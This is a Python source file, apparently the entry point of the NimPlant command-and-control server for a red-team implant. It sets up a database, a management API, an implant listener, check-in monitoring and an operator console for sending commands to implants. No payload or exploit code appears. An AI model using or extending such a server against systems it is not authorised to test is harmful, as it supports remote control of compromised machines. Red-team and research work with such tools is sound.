#!/usr/bin/python3

# -----
#
#   NimPlant Server - The "C2-ish"™ handler for the NimPlant payload
#   By Cas van Cooten (@chvancooten)
#
# -----

import threading
import time

from .api.server import api_server, server_ip, server_port
from .util.db import initDb, dbInitNewServer, dbPreviousServerSameConfig
from .util.func import nimplantPrint, periodicNimplantChecks
from .util.listener import *
from .util.nimplant import *
from .util.input import *


def main(xor_key=459457925, name=""):
    # Initialize the SQLite database
    initDb()

    # Restore the previous server session if config remains unchanged
    # Otherwise, initialize a new server session
    if dbPreviousServerSameConfig(np_server, xor_key):
        nimplantPrint("Existing server session found, restoring...")
        np_server.restoreServerFromDb()
    else:
        np_server.initNewServer(name, xor_key)
        dbInitNewServer(np_server)

    # Start daemonized Flask server for API communications
    t1 = threading.Thread(name="Listener", target=api_server)
    t1.setDaemon(True)
    t1.start()
    nimplantPrint(f"Started management server on http://{server_ip}:{server_port}.")

    # Start another thread for NimPlant listener
    t2 = threading.Thread(name="Listener", target=flaskListener, args=(xor_key,))
    t2.setDaemon(True)
    t2.start()
    nimplantPrint(
        f"Started NimPlant listener on {listenerType.lower()}://{listenerIp}:{listenerPort}. CTRL-C to cancel waiting for NimPlants."
    )

    # Start another thread to periodically check if nimplants checked in on time
    t3 = threading.Thread(name="Listener", target=periodicNimplantChecks)
    t3.setDaemon(True)
    t3.start()

    # Run the console as the main thread
    while True:
        try:
            if np_server.isActiveNimplantSelected():
                promptUserForCommand()
            elif np_server.containsActiveNimplants():
                np_server.selectNextActiveNimplant()
            else:
                pass

            time.sleep(0.5)

        except KeyboardInterrupt:
            exitServerConsole()
